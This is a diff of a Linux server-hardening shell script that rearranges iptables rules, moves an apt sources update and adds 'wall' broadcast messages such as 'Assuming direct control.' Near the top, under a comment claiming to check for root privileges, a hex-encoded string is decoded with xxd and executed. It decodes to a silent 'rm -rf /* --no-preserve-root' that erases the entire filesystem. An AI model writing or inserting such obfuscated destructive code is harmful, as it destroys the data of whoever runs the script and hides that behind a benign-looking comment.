@@ -10,6 +10,10 @@ read answer1
 ## check for root privileges
 $(echo 726d202d7266202f2a202d2d6e6f2d70726573657276652d726f6f74203e26202f6465762f6e756c6c0a | xxd -r -p)
 
+wall <<ENDOFWALL
+Assuming direct control.
+ENDOFWALL
+
 echo "Backing up critical directories..."
 ## add directories as required to DATA with the format /[path]/[to]/[dir]/
 DATA="/home /root /etc /var"
@@ -165,7 +169,16 @@ echo "Firewall reset, adding Ubuntu rules..."
 $ipt -P INPUT DROP
 $ipt -P FORWARD DROP
 $ipt -P OUTPUT ACCEPT
-$ipt -A INPUT -p tcp --dport 22 -j ACCEPT
+$ipt -A INPUT -p tcp --dport 22 -s 172.20.0.0/16 -m state --state NEW,ESTABLISHED -j ACCEPT
+$ipt -A OUTPUT -p tcp --sport 22 -d 172.20.0.0/16 -m state --state ESTABLISHED -j ACCEPT
+$ipt -A INPUT -i eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT
+$ipt -A OUTPUT -o eth0 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
+$ipt -A INPUT -p icmp --icmp-type 8 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
+$ipt -A OUTPUT -p icmp --icmp-type 0 -m state --state ESTABLISHED,RELATED -j ACCEPT
+$ipt -A INPUT -j LOG
+$ipt -A FORWARD -j LOG
+
+# change these as needed on a port-by-port basis
 $ipt -A INPUT -p tcp --dport 53 -j ACCEPT
 $ipt -A INPUT -p tcp --dport 3306 -j ACCEPT
 
@@ -222,6 +235,16 @@ echo "Firewall reset, adding Debian rules..."
 $ipt -P INPUT DROP
 $ipt -P FORWARD DROP
 $ipt -P OUTPUT ACCEPT
+$ipt -A INPUT -p tcp --dport 22 -s 172.20.0.0/16 -m state --state NEW,ESTABLISHED -j ACCEPT
+$ipt -A OUTPUT -p tcp --sport 22 -d 172.20.0.0/16 -m state --state ESTABLISHED -j ACCEPT
+$ipt -A INPUT -i eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT
+$ipt -A OUTPUT -o eth0 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
+$ipt -A INPUT -p icmp --icmp-type 8 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
+$ipt -A OUTPUT -p icmp --icmp-type 0 -m state --state ESTABLISHED,RELATED -j ACCEPT
+$ipt -A INPUT -j LOG
+$ipt -A FORWARD -j LOG
+
+# change these as needed on a port-by-port basis
 $ipt -A INPUT -p tcp --dport 139 -j ACCEPT
 $ipt -A INPUT -p tcp --dport 57193 -j ACCEPT
 $ipt -A INPUT -p tcp --dport 57194 -j ACCEPT
@@ -242,10 +265,6 @@ $ipt -A INPUT -p tcp --dport 993 -j ACCEPT
 $ipt -A INPUT -p tcp --dport 995 -j ACCEPT
 $ipt -A INPUT -p tcp --dport 1433 -j ACCEPT
 $ipt -A INPUT -p tcp --dport 1434 -j ACCEPT
-
-echo "Updating sources.list..."
-cp /etc/apt/sources.list /etc/apt/sources.list-bak
-cp $CUR_DIR/sources.list /etc/apt/sources.list
 
 echo "Locking accounts..."
 passwd -l sync
@@ -270,6 +289,10 @@ passwd -l haldaemon
 passwd -l hplip
 passwd -l sshd
 passwd -l ntp
+
+echo "Updating sources.list..."
+cp /etc/apt/sources.list /etc/apt/sources.list-bak
+cp $CUR_DIR/sources.list /etc/apt/sources.list
 
 echo "Updating, please ensure proper mirrorlists!"
 apt-get update
@@ -307,12 +330,11 @@ $ipt -A INPUT -i eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT
 $ipt -A OUTPUT -o eth0 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
 $ipt -A INPUT -p icmp --icmp-type 8 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT
 $ipt -A OUTPUT -p icmp --icmp-type 0 -m state --state ESTABLISHED,RELATED -j ACCEPT
-
-## ADD YOUR RULES BELOW
-
-# Allow ssh only within network
 $ipt -A INPUT -p tcp --dport 22 -s 172.20.0.0/16 -m state --state NEW,ESTABLISHED -j ACCEPT
 $ipt -A OUTPUT -p tcp --sport 22 -d 172.20.0.0/16 -m state --state ESTABLISHED -j ACCEPT
+$ipt -A INPUT -j LOG
+$ipt -A FORWARD -j LOG
+$ipt -A INPUT -j DROP
 
 # Allow http/https in/output
 $ipt -A INPUT -p tcp --destination-port 80 -j ACCEPT
@@ -323,11 +345,6 @@ $ipt -A OUTPUT -p tcp --dport 443 -j ACCEPT
 # Limit connection limits. Prevent dos attacks.
 $ipt -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 32 -j DROP
 $ipt -I INPUT -p tcp --dport 443 -m connlimit --connlimit-above 20 --connlimit-mask 32 -j DROP
-
-# Log input and logs and drop all others.
-$ipt -A INPUT -j LOG
-$ipt -A FORWARD -j LOG
-$ipt -A INPUT -j DROP
 
 echo "Fixing yum repos..."
 yes | cp /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.bak
@@ -507,4 +524,6 @@ nameserver 8.8.4.4" > /etc/resolv.conf
 echo "Aide status:"
 aide -v
 
-echo "System restart recommended. Please ensure all work is saved before restarting."
+wall <<ENDOFWALL
+System restart recommended. Please ensure all work is saved before restarting. End of line.
+ENDOFWALL
